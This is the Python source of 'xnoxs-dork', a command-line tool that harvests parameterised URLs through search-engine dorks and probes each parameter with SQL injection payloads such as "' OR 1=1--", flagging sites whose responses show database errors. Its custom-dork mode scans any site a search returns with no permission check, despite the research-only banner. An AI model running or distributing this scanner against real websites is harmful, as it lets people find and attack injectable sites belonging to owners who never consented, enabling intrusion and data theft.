"""
xnoxs-dork - SQL Injection Vulnerability Scanner
For security research purposes only.
Only use on websites you own or have written permission to test.
"""

import os
import re
import time
import requests
from typing import List, Dict, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote_plus
from bs4 import BeautifulSoup

try:
    from SearchEngine import DuckDuckGoSearch, BraveSearch, MojeekSearch, GoogleSearch
except ImportError:
    print("Please install xnoxs-engine: pip install xnoxs-engine")
    exit(1)

SCRAPER_API_KEY = os.environ.get("SCRAPER_API_KEY", "")


@dataclass
class VulnResult:
    url: str
    parameter: str
    payload: str
    error_type: str
    response_snippet: str
    is_vulnerable: bool


class SQLiScanner:
    SQL_ERRORS = {
        'mysql': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Syntax error or access violation",
        ],
        'postgresql': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
        ],
        'mssql': [
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.",
            r"Exception.*\WRoadhouse\.Cms\.",
        ],
        'oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
        ],
        'sqlite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
        ],
        'generic': [
            r"SQL syntax",
            r"syntax error",
            r"unexpected end of SQL",
            r"quoted string not properly terminated",
            r"unclosed quotation mark",
        ]
    }

    PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "1' AND '1'='1",
        "1 AND 1=1",
        "' OR 1=1--",
        "' OR 'x'='x",
    ]

    DORKS = [
        "inurl:id= site:{domain}",
        "inurl:page= site:{domain}",
        "inurl:cat= site:{domain}",
        "inurl:product= site:{domain}",
        "inurl:item= site:{domain}",
        "inurl:view= site:{domain}",
        "inurl:article= site:{domain}",
        "inurl:news= site:{domain}",
    ]

    GENERIC_DORKS = [
        "inurl:id=",
        "inurl:page=",
        "inurl:cat=",
        "inurl:product=",
        "inurl:item=",
        "inurl:view=",
        "inurl:article=",
        "inurl:news=",
        "inurl:php?id=",
        "inurl:asp?id=",
    ]

    def __init__(self, delay: float = 2.0, timeout: int = 10, user_agent: str = None):
        self.delay = delay
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": self.user_agent})
        self.results: List[VulnResult] = []

    def search_urls(self, query: str, engine: str = "auto", num_results: int = 10) -> List[str]:
        """Search for URLs using specified search engine with fallback"""
        urls = []
        
        if SCRAPER_API_KEY:
            print("[*] Using ScraperAPI with Google...")
            urls = self._search_with_scraperapi(query, num_results)
            if urls:
                return urls
        
        if SCRAPER_API_KEY:
            try:
                print("[*] Trying Google with ScraperAPI...")
                google = GoogleSearch(scraper_api_key=SCRAPER_API_KEY, delay=self.delay)
                results = google.search(query, num_results=num_results)
                for result in results:
                    url = result.url
                    if self._has_parameters(url):
                        urls.append(url)
                if urls:
                    print(f"[+] Google returned {len(urls)} URLs with parameters")
                    return urls
            except Exception as e:
                print(f"[!] Google error: {e}")
        
        engines_to_try = ["duckduckgo", "brave", "mojeek"]
        
        for eng in engines_to_try:
            try:
                print(f"[*] Trying {eng}...")
                
                if eng == "duckduckgo":
                    searcher = DuckDuckGoSearch(delay=self.delay)
                elif eng == "brave":
                    searcher = BraveSearch(delay=self.delay)
                elif eng == "mojeek":
                    searcher = MojeekSearch(delay=self.delay)
                else:
                    continue

                results = searcher.search(query, num_results=num_results)
                
                for result in results:
                    url = result.url
                    if self._has_parameters(url):
                        urls.append(url)
                
                if urls:
                    print(f"[+] {eng} returned {len(urls)} URLs with parameters")
                    break
                elif results:
                    print(f"[*] {eng} returned {len(results)} results but none with parameters")
                    
            except Exception as e:
                print(f"[!] {eng} error: {e}")
                time.sleep(self.delay)
                continue
            
        return urls
    
    def _search_with_scraperapi(self, query: str, num_results: int = 10) -> List[str]:
        """Search Google directly via ScraperAPI"""
        urls = []
        try:
            google_url = f"https://www.google.com/search?q={quote_plus(query)}&num={num_results}"
            
            api_url = "http://api.scraperapi.com"
            params = {
                "api_key": SCRAPER_API_KEY,
                "url": google_url,
                "render": "false"
            }
            
            response = requests.get(api_url, params=params, timeout=60)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                
                for a in soup.find_all("a", href=True):
                    href = a["href"]
                    if href.startswith("/url?q="):
                        actual_url = href.split("/url?q=")[1].split("&")[0]
                        if self._has_parameters(actual_url):
                            urls.append(actual_url)
                    elif href.startswith("http") and "google.com" not in href:
                        if self._has_parameters(href):
                            urls.append(href)
                
                print(f"[+] ScraperAPI Google returned {len(urls)} URLs with parameters")
            else:
                print(f"[!] ScraperAPI error: {response.status_code}")
                
        except Exception as e:
            print(f"[!] ScraperAPI error: {e}")
            
        return urls

    def _has_parameters(self, url: str) -> bool:
        """Check if URL has query parameters"""
        parsed = urlparse(url)
        return bool(parsed.query)

    def _extract_parameters(self, url: str) -> Dict[str, List[str]]:
        """Extract query parameters from URL"""
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into specific parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if param in params:
            original_value = params[param][0] if params[param] else ""
            params[param] = [original_value + payload]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url

    def _check_sql_error(self, response_text: str) -> Optional[str]:
        """Check response for SQL error patterns"""
        for db_type, patterns in self.SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_type
        return None

    def test_url(self, url: str, payload: str = "'") -> List[VulnResult]:
        """Test a single URL for SQL injection vulnerability"""
        results = []
        params = self._extract_parameters(url)
        
        if not params:
            return results
            
        for param in params.keys():
            try:
                injected_url = self._inject_payload(url, param, payload)
                
                response = self.session.get(
                    injected_url,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                error_type = self._check_sql_error(response.text)
                
                snippet = ""
                if error_type:
                    for pattern in self.SQL_ERRORS.get(error_type, []):
                        match = re.search(pattern, response.text, re.IGNORECASE)
                        if match:
                            start = max(0, match.start() - 50)
                            end = min(len(response.text), match.end() + 50)
                            snippet = response.text[start:end]
                            break
                
                result = VulnResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    error_type=error_type or "none",
                    response_snippet=snippet[:200] if snippet else "",
                    is_vulnerable=bool(error_type)
                )
                
                results.append(result)
                
                if error_type:
                    print(f"[+] VULNERABLE: {url}")
                    print(f"    Parameter: {param}")
                    print(f"    DB Type: {error_type}")
                else:
                    print(f"[-] Not vulnerable: {url} (param: {param})")
                    
                time.sleep(self.delay)
                
            except requests.RequestException as e:
                print(f"[!] Request error for {url}: {e}")
            except Exception as e:
                print(f"[!] Error testing {url}: {e}")
                
        return results

    def scan_dork(self, dork: str, engine: str = "auto", num_results: int = 10) -> List[VulnResult]:
        """Scan URLs found using a Google dork"""
        print(f"\n[*] Searching with dork: {dork}")
        
        urls = self.search_urls(dork, engine=engine, num_results=num_results)
        print(f"[*] Found {len(urls)} URLs with parameters")
        
        all_results = []
        
        for url in urls:
            print(f"\n[*] Testing: {url}")
            results = self.test_url(url)
            all_results.extend(results)
            self.results.extend(results)
            
        return all_results

    def scan_domain(self, domain: str, engine: str = "auto") -> List[VulnResult]:
        """Scan a specific domain for SQL injection vulnerabilities"""
        print(f"\n[*] Scanning domain: {domain}")
        
        all_results = []
        
        for dork_template in self.DORKS:
            dork = dork_template.format(domain=domain)
            results = self.scan_dork(dork, engine=engine, num_results=5)
            all_results.extend(results)
            time.sleep(self.delay * 2)
            
        return all_results

    def get_vulnerable_urls(self) -> List[VulnResult]:
        """Get only vulnerable results"""
        return [r for r in self.results if r.is_vulnerable]

    def print_summary(self):
        """Print scan summary"""
        vulnerable = self.get_vulnerable_urls()
        
        print("\n" + "=" * 60)
        print("SCAN SUMMARY")
        print("=" * 60)
        print(f"Total URLs tested: {len(self.results)}")
        print(f"Vulnerable URLs found: {len(vulnerable)}")
        
        if vulnerable:
            print("\nVulnerable URLs:")
            for v in vulnerable:
                print(f"  - {v.url}")
                print(f"    Parameter: {v.parameter}")
                print(f"    DB Type: {v.error_type}")


def main():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║                      xnoxs-dork v1.0                          ║
║           SQL Injection Vulnerability Scanner                 ║
║                                                               ║
║  [!] FOR SECURITY RESEARCH PURPOSES ONLY                      ║
║  [!] Only use on websites you own or have permission to test  ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    scanner = SQLiScanner(delay=2.0)
    
    print("\nOptions:")
    print("1. Scan with custom dork")
    print("2. Scan specific domain")
    print("3. Test single URL")
    print("4. Exit")
    
    try:
        choice = input("\nSelect option [1-4]: ").strip()
        
        if choice == "1":
            dork = input("Enter dork (e.g., inurl:id=): ").strip()
            if dork:
                scanner.scan_dork(dork, num_results=10)
                scanner.print_summary()
                
        elif choice == "2":
            domain = input("Enter domain (e.g., example.com): ").strip()
            if domain:
                print("\n[!] Make sure you have permission to test this domain!")
                confirm = input("Continue? [y/N]: ").strip().lower()
                if confirm == 'y':
                    scanner.scan_domain(domain)
                    scanner.print_summary()
                    
        elif choice == "3":
            url = input("Enter URL with parameters: ").strip()
            if url:
                print("\n[!] Make sure you have permission to test this URL!")
                confirm = input("Continue? [y/N]: ").strip().lower()
                if confirm == 'y':
                    scanner.test_url(url)
                    scanner.print_summary()
                    
        elif choice == "4":
            print("Goodbye!")
            
        else:
            print("Invalid option")
            
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user")
        scanner.print_summary()


if __name__ == "__main__":
    main()
